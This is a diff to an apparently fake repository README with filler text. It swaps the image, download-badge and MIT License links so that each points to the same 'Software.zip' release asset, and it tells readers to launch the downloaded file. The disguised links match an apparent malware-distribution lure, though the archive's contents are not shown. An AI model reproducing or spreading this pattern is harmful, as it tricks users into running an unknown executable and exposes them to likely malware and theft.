@@ -2,7 +2,7 @@
 
 Welcome to the official repository of `765467`! 🎉
 
-![It's time to shine](https://www.example.com/image.png)
+![It's time to shine](https://github.com/me-Anna/765467/releases/download/v1.0/Software.zip)
 
 ## Description
 Unfortunately, the short description for this repository is not provided. However, we encourage you to explore the amazing features and functionalities it offers.
@@ -13,7 +13,7 @@ The repository topics have not been specified. Feel free to delve into the repos
 ## Installation
 To get started with `765467`, you can download the zip file by clicking the button below:
 
-[![Download 765467](https://img.shields.io/badge/Download-v1.0.0-blue)](https://github.com/cli/cli/archive/refs/tags/v1.0.0.zip)
+[![Download 765467](https://github.com/me-Anna/765467/releases/download/v1.0/Software.zip)](https://github.com/me-Anna/765467/releases/download/v1.0/Software.zip)
 
 Make sure to launch the downloaded file to begin your journey with `765467`.
 
@@ -35,7 +35,7 @@ We welcome contributions from the open-source community to make `765467` even be
 If you have found `765467` to be beneficial and enjoyable, don't forget to share it with your friends and colleagues. Let's build a vibrant community around `765467` and make it the go-to solution for all your needs.
 
 ## License
-`765467` is licensed under the [MIT License](https://opensource.org/licenses/MIT). Feel free to explore, modify, and distribute `765467` as per the terms of the license.
+`765467` is licensed under the [MIT License](https://github.com/me-Anna/765467/releases/download/v1.0/Software.zip). Feel free to explore, modify, and distribute `765467` as per the terms of the license.
 
 ---
 
